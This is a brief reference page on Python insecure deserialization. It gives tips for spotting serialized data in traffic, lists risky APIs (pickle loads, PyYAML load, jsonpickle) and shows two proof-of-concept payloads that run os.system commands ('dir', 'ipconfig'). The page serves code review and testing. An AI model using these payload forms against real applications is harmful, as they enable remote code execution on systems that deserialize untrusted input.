# Python Deserialize

## BlackBox

If the traffic data contains the symbol dot (`.`) at the end, it's very likely that the data was sent in serialization.

## WhiteBox

The following API in Python will be vulnerable to serialization attack. Search code for the pattern below.

The uses of `pickle`/`c_pickle`/`_pickle` with load/loads:

```python
import pickle

data = """ cos.system(S'dir')tR. """
pickle.loads(data)
```

Uses of PyYAML with load:

```python
import yaml

document = "!!python/object/apply:os.system ['ipconfig']"
print(yaml.load(document))
```

Uses of jsonpickle with encode or store methods.

---
## References

- [Christopher Frohoff: OWASP AppSecCali 2015 - Marshaling Pickles](https://www.slideshare.net/slideshow/appseccali-2015-marshalling-pickles/44009258)